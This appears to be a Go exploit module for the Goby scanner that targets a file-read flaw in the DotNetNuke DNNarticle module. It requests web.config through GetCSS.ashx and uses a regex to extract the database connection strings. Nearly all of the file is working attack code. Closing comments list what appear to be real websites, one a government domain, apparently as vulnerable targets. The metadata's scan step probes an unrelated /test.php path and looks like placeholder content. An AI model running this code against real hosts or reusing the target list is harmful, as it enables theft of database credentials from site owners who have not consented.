package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DNNarticle file manage system GetCSS.ashxy Dbinfo leakage",
    "Description": "Provide a total solution for content management. Such as articles, news, announcements, product catalogs, etc. can be organized into unlimited levels of categories. You can also send emails when adding new content",
    "Product": "DotNetNuke DNNarticle Module 11",
    "Homepage": "https://zldnn.com",
    "DisclosureDate": "2021-06-07",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "(header=\"dnn_IsMobile\" || banner=\"dnn_IsMobile\")",
    "Level": "3",
    "Impact": "<p>The attacker can directly read the relevant system information of the file system, including user names, database passwords, etc. Attackers use the leaked sensitive information to provide help for further attacks.</p>",
    "Recommendation": "<p>1. Enter the parameters for safety inspection. </p><p>2. Update to the latest version in time. URL:<a href=\"http://zldnn.com\">http://zldnn.com</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/444"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10214"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config&smid=512&portalid=3")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "SiteSqlServer") && strings.Contains(resp.Utf8Html, "DefaultDevicesDatabase")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config&smid=512&portalid=3")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				resinfo := regexp.MustCompile(`(?s)<connectionStrings>(.*?)</connectionStrings>`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = resinfo
			}
			return expResult
		},
	))
}

//header="dnn_IsMobile" && body="DnnModule-DNN_HTML"
// www.oink.ca:80
// www.nat.go.th:80
// https://www.scam.fr
